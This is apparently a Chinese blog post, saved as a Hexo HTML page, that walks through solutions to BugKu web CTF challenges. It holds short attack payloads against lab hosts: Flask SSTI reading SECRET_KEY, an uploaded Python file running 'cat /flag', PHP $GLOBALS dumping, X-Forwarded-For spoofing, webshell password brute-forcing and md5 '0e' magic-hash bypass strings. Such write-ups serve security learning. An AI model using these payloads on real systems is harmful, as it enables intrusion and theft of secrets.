@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BugKu Web 刷题记录1 | Evolution957's blog</title><meta name="keywords" content="CTF,Web,BugKu"><meta name="author" content="Evolution957"><meta name="copyright" content="Evolution957"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BugKu Web 刷题记录1 参考： BugKu-Web-wp1 BugKu-Web-wp2 BugKu-Web-wp3 flask之ssti模版注入从零到入门  Simple_SSTI_1F12查看源码  输入 http:&#x2F;&#x2F;114.67.175.224:17350&#x2F;?flag&#x3D;&amp;#123;&amp;#123;config.SECRET_KEY&amp;#125;&amp;#125;   Simple_SSTI_2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BugKu Web 刷题记录1">
+<meta property="og:url" content="https://evolution957.github.io/2022/04/24/BugKu-Web1/index.html">
+<meta property="og:site_name" content="Evolution957&#39;s blog">
+<meta property="og:description" content="BugKu Web 刷题记录1 参考： BugKu-Web-wp1 BugKu-Web-wp2 BugKu-Web-wp3 flask之ssti模版注入从零到入门  Simple_SSTI_1F12查看源码  输入 http:&#x2F;&#x2F;114.67.175.224:17350&#x2F;?flag&#x3D;&amp;#123;&amp;#123;config.SECRET_KEY&amp;#125;&amp;#125;   Simple_SSTI_2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://evolution957.github.io/img/BugKu_Web1.jpg">
+<meta property="article:published_time" content="2022-04-24T08:30:27.000Z">
+<meta property="article:modified_time" content="2022-04-24T08:30:27.000Z">
+<meta property="article:author" content="Evolution957">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BugKu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://evolution957.github.io/img/BugKu_Web1.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://evolution957.github.io/2022/04/24/BugKu-Web1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BugKu Web 刷题记录1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-24 16:30:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/iconfont.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Evolution957's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/BugKu_Web1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evolution957's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BugKu Web 刷题记录1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-24T08:30:27.000Z" title="发表于 2022-04-24 16:30:27">2022-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-24T08:30:27.000Z" title="更新于 2022-04-24 16:30:27">2022-04-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Web/">CTF_Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BugKu Web 刷题记录1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="BugKu-Web-刷题记录1"><a href="#BugKu-Web-刷题记录1" class="headerlink" title="BugKu Web 刷题记录1"></a>BugKu Web 刷题记录1</h1><blockquote>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p>
+</blockquote>
+<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12查看源码</p>
+<p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p>
+<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p>
+<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>创建111.txt并输入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>修改文件名为111.jpg后上传文件即可得到flag</p>
+<p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p>
+<h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p>
+<p>F12后，ctrl+f搜索flag即可</p>
+<p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p>
+<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12，修改长度限制，随后输入正确计算结果即可。</p>
+<p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p>
+<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p>
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>第一个条件是不能为数字，第二个条件是&#x3D;&#x3D;比较，和整型比较是会先把字符串转化为整型，’1admin’在比较时候会变成1</p>
+<p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p>
+<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>查看源代码</p>
+<p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p>
+<p>放到html中显示</p>
+<p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p>
+<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>burp suite抓包</p>
+<p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p>
+<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>关键在于这一句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p>故传入args&#x3D;GLOBALS,最后会输出​GLOBALS,flag就在其中</p>
+<p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p>
+<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>抓包查看响应包</p>
+<p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p>
+<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>提示有无后门，用御剑扫描一下发现shell.php</p>
+<p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p>
+<p>进入后发现需要输入密码</p>
+<p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p>
+<p>用burp爆破获得密码</p>
+<p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p>
+<p>输入密码后得到flag</p>
+<p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p>
+<h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>F12查看发现编码</p>
+<p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p>
+<p>放进base64中解密得到密码，由于是管理员，故猜测账户为admin</p>
+<p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p>
+<p>输入后发现ip被ban</p>
+<p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p>
+<p>使用burp进行ip伪造获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>F12查看得到代码</p>
+<p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p>
+<p>用以下代码解码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p>
+<p>输入密码即可得到flag</p>
+<p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p>
+<h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>根据提示（z?????）猜测为z开头的6位密码，直接用burp爆破（注意加上标记code: ‘bugku10000’，不然所有返回字段都相同）</p>
+<p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>使用扫描工具扫描（<a target="_blank" rel="noopener" href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>）</p>
+<p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p>
+<p>输入&#x2F;index.php.bak后缀下载得到源文件index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr 获得URI从&#x27;?&#x27;往后(包括&#x27;?&#x27;)的字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr 去掉&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//把$str中的所有key去掉</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//把字符串解析到变量里</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1和key2的md5值相等但二者不恒等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p>
+<p>介绍一批md5是0e开头的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/">Evolution957</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/2022/04/24/BugKu-Web1/">https://evolution957.github.io/2022/04/24/BugKu-Web1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Evolution957.github.io" target="_blank">Evolution957's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/BugKu/">BugKu</a></div><div class="post_share"><div class="social-share" data-image="/img/BugKu_Web1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/21/pikachu/"><img class="next-cover" src="/img/pikachu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pikachu靶场刷题记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/04/21/pikachu/" title="pikachu靶场刷题记录"><img class="cover" src="/img/pikachu.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">pikachu靶场刷题记录</div></div></a></div><div><a href="/2022/04/20/2022StarCTF-Misc-babyFL/" title="2022StarCTF-Misc-babyFL"><img class="cover" src="/img/babyFL.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">2022StarCTF-Misc-babyFL</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BugKu-Web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951"><span class="toc-number">1.</span> <span class="toc-text">BugKu Web 刷题记录1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-SSTI-1"><span class="toc-number">1.1.</span> <span class="toc-text">Simple_SSTI_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-SSTI-2"><span class="toc-number">1.2.</span> <span class="toc-text">Simple_SSTI_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-FileUpload"><span class="toc-number">1.3.</span> <span class="toc-text">Flask_FileUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%91%E7%A8%BD"><span class="toc-number">1.4.</span> <span class="toc-text">滑稽</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">1.5.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">1.6.</span> <span class="toc-text">GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">1.7.</span> <span class="toc-text">POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alert"><span class="toc-number">1.9.</span> <span class="toc-text">alert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B"><span class="toc-number">1.10.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F1"><span class="toc-number">1.11.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="toc-number">1.12.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">1.13.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.14.</span> <span class="toc-text">本地管理员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.15.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bp"><span class="toc-number">1.16.</span> <span class="toc-text">bp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="toc-number">1.17.</span> <span class="toc-text">备份是个好习惯</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Evolution957</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">岂能尽如人意，但求无愧我心</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script 